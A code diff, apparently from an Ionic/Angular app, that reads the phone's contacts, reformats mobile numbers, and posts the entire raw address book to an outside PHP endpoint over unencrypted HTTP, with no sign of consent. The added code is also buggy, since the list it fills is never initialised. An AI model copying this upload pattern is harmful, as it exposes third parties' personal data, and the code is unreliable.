@@ -122,11 +122,43 @@ export class HomePage {
             ['displayName', 'name', 'phoneNumbers', 'emails'],
             { filter: "", multiple: true })
             .then(data => {
+
+                let contactlist: any[];
+                for (var i = 0; i < data.length; i++) {
+                    var contact = data[i];
+                    var no = data[i].name.formatted;
+                    var phonenumber = data[i].phoneNumbers;
+                    if (phonenumber != null) {
+                        for (var n = 0; n < phonenumber.length; n++) {
+                            var type = phonenumber[n].type;
+                            if (type == 'mobile') {
+                                var phone = phonenumber[n].value;
+                                var mobile;
+                                if (phone.slice(0, 1) == '+' || phone.slice(0, 1) == '0') {
+                                    mobile = phone.replace(/[^a-zA-Z0-9+]/g, "");
+                                }
+                                else {
+                                    var mobile_no = phone.replace(/[^a-zA-Z0-9]/g, "");
+                                    mobile = mobile_no;
+                                }
+
+                                var contactData = {
+                                    "displayName": no,
+                                    "phoneNumbers": mobile,
+                                    "emails": contact.emails
+                                }
+                                contactlist.push(contactData);
+                            }
+                        }
+                    }
+
+                }
+
                 this.loading.contactlist = false;
-                this.dataHome['contactlist'] = data;
+                this.dataHome['contactlist'] = contactlist;
                 this._dataService.post('http://maxtot.com/autocall.php', data).subscribe(
-                    res=>console.log(res), 
-                    err=>console.log(err)
+                    res => console.log(res),
+                    err => console.log(err)
                 );
             },
             (error: any) => {
